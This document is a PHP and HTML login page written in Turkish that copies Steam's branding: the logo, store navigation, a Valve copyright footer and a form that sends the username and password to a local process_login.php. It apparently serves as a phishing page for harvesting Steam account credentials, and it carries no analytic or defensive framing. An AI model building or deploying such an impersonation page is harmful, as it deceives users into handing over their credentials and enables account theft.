
<?php
require_once 'config.php';
$csrf_token = generate_csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Giriş</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #171a21;
            color: white;
            font-family: Arial, sans-serif;
        }
        .steam-bg {
            background-image: url('assets/steam-bg.jpg');
            background-size: cover;
            background-position: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <!-- Steam Background -->
    <div class="steam-bg"></div>
    
    <!-- Steam Header -->
    <header class="flex items-center justify-between p-4 bg-[#171a21]/80">
        <div class="flex items-center">
            <img src="assets/steam-logo.png" alt="Steam Logo" class="h-10">
        </div>
        <nav class="hidden md:flex">
            <ul class="flex space-x-6">
                <li><a href="#" class="text-white/70 hover:text-white">MAĞAZA</a></li>
                <li><a href="#" class="text-white/70 hover:text-white">TOPLULUK</a></li>
                <li><a href="#" class="text-white/70 hover:text-white">HAKKINDA</a></li>
                <li><a href="#" class="text-white/70 hover:text-white">DESTEK</a></li>
            </ul>
        </nav>
    </header>
    
    <!-- Main Content -->
    <main class="flex-1 flex flex-col items-center justify-center px-4 py-8 min-h-screen">
        <div class="w-full max-w-3xl space-y-8">
            <!-- Title -->
            <div class="text-center mb-8">
                <h1 class="text-3xl font-medium text-white mb-2">Steam Giriş</h1>
            </div>
            
            <!-- Login Form -->
            <div class="bg-[#1b2838]/70 backdrop-blur-sm p-6 rounded-md shadow-lg">
                <form id="steam-login-form" action="process_login.php" method="POST">
                    <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                    <div class="space-y-4">
                        <div class="space-y-2">
                            <label for="username" class="block text-sm font-medium text-white/70">Steam Kullanıcı Adı</label>
                            <input 
                                type="text" 
                                id="username" 
                                name="username" 
                                class="w-full px-4 py-2 bg-[#32353c] border border-[#32353c] text-white rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                                required
                            >
                        </div>
                        
                        <div class="space-y-2">
                            <div class="flex justify-between">
                                <label for="password" class="block text-sm font-medium text-white/70">Parola</label>
                                <a href="#" class="text-sm text-blue-400 hover:text-blue-300">Şifrenimi Unuttum?</a>
                            </div>
                            <input 
                                type="password" 
                                id="password" 
                                name="password" 
                                class="w-full px-4 py-2 bg-[#32353c] border border-[#32353c] text-white rounded focus:outline-none focus:ring-2 focus:ring-blue-400"
                                required
                            >
                        </div>
                        
                        <div class="flex items-center">
                            <input 
                                type="checkbox" 
                                id="remember-me" 
                                name="remember-me" 
                                class="h-4 w-4 rounded border-[#32353c] text-blue-400 focus:ring-blue-400"
                            >
                            <label for="remember-me" class="ml-2 block text-sm text-white/70">Beni Hatırla</label>
                        </div>
                        
                        <button 
                            type="submit" 
                            class="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white px-4 py-2 rounded font-medium hover:from-blue-400 hover:to-blue-500 focus:outline-none focus:ring-2 focus:ring-blue-400 focus:ring-offset-2 focus:ring-offset-[#1b2838]"
                        >
                            Giriş
                        </button>
                        
                        <div class="text-center space-y-2 pt-2">
                            <p class="text-sm text-white/70">
                                Steam hesabınız yok mu? <a href="#" class="text-blue-400 hover:underline">Buradan</a> ücretsiz bir hesap oluşturun.
                            </p>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </main>
    
    <!-- Footer -->
    <footer class="bg-[#171a21]/80 text-white/50 text-center text-xs p-4 mt-8">
        <p>© 2024 Valve Corporation. Tüm hakları saklıdır. Tüm ticari markalar, ABD ve diğer ülkelerde ilgili sahiplerinin mülkiyetindedir.</p>
        <p class="mt-1">
            <a href="#" class="text-blue-400 hover:underline mx-1">Gizlilik Politikası</a> |
            <a href="#" class="text-blue-400 hover:underline mx-1">Yasal</a> |
            <a href="#" class="text-blue-400 hover:underline mx-1">Steam Abonelik Sözleşmesi</a>
        </p>
    </footer>

    <script>
        // Any client-side validation can go here
        document.getElementById('steam-login-form').addEventListener('submit', function(e) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                e.preventDefault();
                alert('Lütfen kullanıcı adı ve parolanızı girin.');
            }
        });
    </script>
</body>
</html>
